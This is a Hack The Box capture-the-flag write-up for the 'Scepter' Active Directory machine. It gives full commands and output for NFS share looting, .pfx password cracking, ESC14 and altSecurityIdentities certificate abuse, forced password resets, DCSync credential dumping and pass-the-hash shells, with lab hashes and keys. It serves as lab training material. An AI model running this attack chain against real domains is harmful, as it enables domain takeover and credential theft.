# Nmap
```
# Nmap 7.95 scan initiated Fri Jul 18 15:18:05 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.65
Nmap scan report for 10.10.11.65
Host is up (0.43s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 15:57:03Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status445/tcp  open  microsoft
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-07-18T15:58:55+00:00; +38m53s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T15:58:54+00:00; +38m52s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T15:58:55+00:00; +38m53s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
3269/tcp open  ssl/ldap
|_ssl-date: 2025-07-18T15:58:54+00:00; +38m52s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-07-18T15:58:54+00:00; +38m52s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T00:21:41
|_Not valid after:  2025-11-01T00:41:41
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-18T15:58:17
|_  start_date: N/A
|_clock-skew: mean: 38m51s, deviation: 1s, median: 38m51s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 18 15:20:38 2025 -- 1 IP address (1 host up) scanned in 154.01 seconds
```

Add `dc01.scepter.htb` and `scepter.htb` to our `/etc/hosts`

And also change your `/etc/krb5.conf`
```
[libdefaults]
  default_realm = SCEPTER.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  SCEPTER.HTB = {
    kdc = dc01.scepter.htb
  }

[domain_realm]
  .scepter.htb = SCEPTER.HTB
  scepter.htb = SCEPTER.HTB

```

# Port 2049 NFS
After simply enumerate the valid services, most of them returned `STATUS_ACCESS_DENIED`.

But we can find something interesting from port `2049` service:
```
nlockmgr (Network Lock Manager) is a service related to NFS (Network File System), which is used to implement the file locking mechanism in the network file system.
```

That means we can use `mount` to interact with that
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ showmount -e 10.10.11.65  
Export list for 10.10.11.65:
/helpdesk (everyone)
```
We can mount it and check what files in it:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ mkdir /tmp/helpdesk
                                                                                      
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ sudo mount -t nfs 10.10.11.65:/helpdesk /tmp/helpdesk

┌──(root㉿localhost)-[/home/wither/Templates/htb-labs/Scepter]
└─# ls -al /tmp/helpdesk         
total 21
drwx------  2 nobody nogroup   64 Nov  2  2024 .
drwxrwxrwt 24 root   root     560 Jul 18 15:28 ..
-rwx------  1 nobody nogroup 2484 Nov  2  2024 baker.crt
-rwx------  1 nobody nogroup 2029 Nov  2  2024 baker.key
-rwx------  1 nobody nogroup 3315 Nov  2  2024 clark.pfx
-rwx------  1 nobody nogroup 3315 Nov  2  2024 lewis.pfx
-rwx------  1 nobody nogroup 3315 Nov  2  2024 scott.pfx
```

The certificate and key files seem to be intended for us to authenticate, we can use `pfx2john` to help us crack them
```
┌──(root㉿localhost)-[/tmp/helpdesk]
└─# pfx2john lewis.pfx > /home/wither/Templates/htb-labs/Scepter/lewis.hash

┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ john lewis.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
newpassword      (lewis.pfx)     
1g 0:00:00:00 DONE (2025-07-18 15:34) 1.754g/s 14371p/s 14371c/s 14371C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

But when we use this credential to log in, an error occurs
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ impacket-getTGT scepter.htb/'e.lewis':'newpassword'     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

# Create new pfx for baker
We have get the `baker.crt` and `baker.key`, so we can try to create new one `pfx` file
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt -passout pass:newpassword

Enter pass phrase for baker.key:

```

Then we can use `certipy`to pass the auth
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -password newpassword

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'd.baker@scepter.htb'
[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-1106'
[*] Using principal: 'd.baker@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'd.baker.ccache'
[*] Wrote credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce

┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ export KRB5CCNAME=d.baker.ccache 
```

# Bloodhound by d.baker
Then we can run the Bloodhound to information gathering
```
bloodhound-python -u 'd.baker' --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' -d scepter.htb -ns 10.10.11.65 --auth-method ntlm -c All --zip --disable-autogc
```

![](images/Pasted%20image%2020250718164515.png)
If we wanna get the control of DC server, we need to get access to `P.ADAMS`

![](images/Pasted%20image%2020250718163206.png)
![](images/Pasted%20image%2020250718163224.png)
We can force change the password of `A.carter`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ bloodyAD -k --host dc01.scepter.htb -d scepter.htb -u 'D.BAKER' set password A.CARTER 'Abc123456@' 
[+] Password changed successfully!
```

Then we can get the `TGT ticket` of `a.carter`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ impacket-getTGT scepter.htb/'a.carter':'Abc123456@' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in a.carter.ccache

┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ export KRB5CCNAME=a.carter.ccache 
```

# Bloodhound by A.Carter
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ bloodhound-python  -u 'a.carter' -p 'Abc123456@' -k -d scepter.htb -ns 10.10.11.65 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: scepter.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
INFO: Done in 01M 32S
INFO: Compressing output into 20250718165046_bloodhound.zip
```

Let's come back Bloodhound to check `A.Carter`
![](images/Pasted%20image%2020250718165343.png)
`A.Carter` is from the IT support group. IT support can perform `STAFF_ACCESS_CERTIFICATE`

# ESC 14 condition
Based on the information we have, we can fully control d.baker, including modifying its various properties, and satisfying the `ESC 14` condition:
`https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82`

Step 1: Confirm or set `GenericAll`:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ bloodyAD -d scepter.htb -u a.carter -p 'Abc123456@' --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB

```
Step 2: Modify the d.baker's mail attribute to impersonate another user:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ bloodyAD -d scepter.htb -u a.carter -p 'Abc123456@' --host dc01.scepter.htb --dc-ip 10.10.11.65 set object d.baker mail -v h.brown@scepter.htb
[+] d.baker's mail has been updated
```

Step 3: Requesting Certificate as H.Brown
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ certipy-ad req -username "d.baker@scepter.htb" -hashes aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.scepter.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: SCEPTER.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'd.baker.pfx'
[*] Wrote certificate and private key to 'd.baker.pfx'
```

Step 4: Authentication as h.brown:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ certipy-ad auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'h.brown@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'h.brown.ccache'
[*] Wrote credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ export KRB5CCNAME=h.brown.ccache 

```

Then we can get the shell as `h.brown` by using `evil-winrm`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ evil-winrm -i dc01.scepter.htb -u 'h.brown' -r scepter.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.brown\Documents> 

```

# Bloodhound by h.brown
![](images/Pasted%20image%2020250718183447.png)
h.brown is a component of Certificate Management Service,(CMS) so the certificate-related attributes of other users can be modified in the same way

# altSecurityIdentities exploit
First modify `p.adams` `altSecurityIdentities` property with h.brown identity
```
bloodyAD --dc-ip 10.10.11.65 --host dc01.scepter.htb -d scepter.htb -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>h.brown@scepter.htb'
```
Then Modify `d.baker` mail
```
bloodyAD -d "scepter.htb" -u "a.carter" -p 'Abc123456@' --host "dc01.scepter.htb" set object "d.baker" mail -v "p.adams@scepter.htb"
```

Request a `p.adams` certificate using the d.baker identity
```
export KRB5CCNAME="d.baker.ccache"

certipy-ad req -k -username "p.adams" -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -out p.adams
```

Authentication of `p.adams` certificate
```
certipy-ad auth -pfx "padams.pfx" -domain "scepter.htb" -dc-ip "10.10.11.65" -username "p.adams"

export KRB5CCNAME=p.adams.ccache
```

Start `DCSync`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Scepter]
└─$ impacket-secretsdump -k -no-pass 'scepter.htb/p.adams@dc01.scepter.htb' -just-dc-user Administrator

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
Administrator:des-cbc-md5:f79d45bf688aa238
[*] Cleaning up... 
```

Then we can use `evil-winrm` to get the shell as administrator
```
evil-winrm -i 10.10.11.65 -u Administrator -H 'a291ead3493f9773dc615e66c2ea21c4'
```

# Description

This machine mainly exploits the abuse of the certificate authentication part, especially the exploit of ESC 14. It is an AD domain machine that is worth studying and reviewing repeatedly.